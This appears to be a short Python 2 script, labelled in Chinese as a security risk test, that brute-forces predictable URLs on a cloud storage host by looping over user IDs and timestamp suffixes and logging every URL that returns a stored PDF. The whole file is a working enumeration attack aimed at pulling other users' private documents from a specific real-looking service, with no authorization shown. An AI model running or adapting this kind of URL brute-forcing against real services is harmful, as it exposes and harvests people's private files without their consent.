# coding=utf-8
# ===============================================================================
# @ Creator:zhn
# @ Date:2015-9-21
# 安全风险测试-遍历用户文档
# http://7xkurf.com1.z0.glb.clouddn.com/stockpdf/7XJ05031/1457186533896
# ===============================================================================
import urllib2
fp = open('E:\\test\log.txt', 'a')
for i in range(5031, 5040):
    for j in range(9000, 99999):
        url = 'http://7xkurf.com1.z0.glb.clouddn.com/stockpdf/7XJ0'+str(i)+'/14568148'+str(j)
        try:
            s = urllib2.urlopen(url).read()
            if s:
                fp.writelines(str(i)+'##'+str(j))
        except urllib2.HTTPError, e:
            print e.code
        except urllib2.URLError, e:
            print str(e)
fp.close()